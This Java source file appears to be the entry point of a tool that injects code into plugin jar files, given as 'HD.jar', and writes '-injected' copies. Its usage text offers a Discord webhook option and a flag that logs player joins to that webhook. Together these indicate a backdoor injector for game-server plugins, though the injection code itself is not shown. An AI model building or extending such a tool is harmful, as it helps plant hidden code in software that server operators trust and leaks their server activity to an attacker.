package fr.bodyalhoha.ectasy;

import fr.bodyalhoha.ectasy.utils.Injector;
import fr.bodyalhoha.ectasy.utils.JarLoader;
import fr.bodyalhoha.ectasy.utils.OptionsParser;
import jdk.internal.org.objectweb.asm.Opcodes;
import org.objectweb.asm.tree.*;

import java.io.File;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;


public class Main {

    public static void printUsage(String name, String desc, String example){
        System.out.println(" " + name + " : " + desc + " (ex : " + example + ")");
    }

    public static void main(String[] args){

        OptionsParser parser = new OptionsParser(args, new String[]{"i", "input", "o", "output", "webhook"}, new String[]{"logjoins"});

        String input = parser.get("input", "i");

        if(input == null){
            /* usage */


            System.out.println("***** USAGE *****");
            printUsage("input", "The jar or directory to inject", "java -jar --input HD.jar");
            printUsage("output", "The output jar or directory", "java -jar --input HD.jar --output HD-injected.jar");
            printUsage("webhook", "Discord webhook", "java -jar --input HD.jar --webhook <link>");
            printUsage("logjoins", "Logs to webhook when a player join the server", "java -jar --input HD.jar --webhook <link> --logjoins");

            System.out.println("****************");


            return;
        }
        File inputFile = new File(input);
        if(!inputFile.exists()){
            System.out.println("Error : " + input + " not found.");
            return;
        }

        if(inputFile.isDirectory()){
            Injector.injectDirectory(inputFile, parser.getDefault("output", "output"), parser);
            return;
        }


        String output = parser.getDefault(input.substring(0, input.length() - 4) + "-injected.jar", "o", "output");
        Injector.inject(input, output, parser);



    }

}
